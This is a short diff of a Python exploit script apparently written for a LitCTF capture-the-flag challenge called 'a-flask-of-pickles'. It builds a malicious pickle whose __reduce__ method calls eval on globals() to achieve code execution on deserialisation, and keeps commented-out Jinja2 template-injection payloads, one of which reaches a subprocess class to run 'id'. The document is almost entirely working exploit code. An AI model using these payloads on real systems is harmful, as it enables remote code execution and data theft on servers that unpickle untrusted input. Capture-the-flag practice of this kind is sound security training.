@@ -6,11 +6,12 @@ url = "https://a-flask-of-pickles.litctf.live/"
 
 class Exploit():
     def __reduce__(self):
-        from flask import render_template_string
+        # render is too long payload
+        # from flask import render_template_string
         # return render_template_string, ("{{url_for.__globals__.current_app.__dict__.listdir('./')}}",)
-        # return render_template_string, ("{{ [].class.base.subclasses() }}",)
+        # return render_template_string, ("{{ ''.__class__.__mro__[1].__subclasses__()[365]('id') }}",)
         # return render_template_string, ('{{ eval("str(globals())") }}',)
-        return eval, ('str(globals())',)
+        return eval, ('(globals())',)
 
 
 payload = pickle.dumps({'name': '', 'bio': Exploit()})
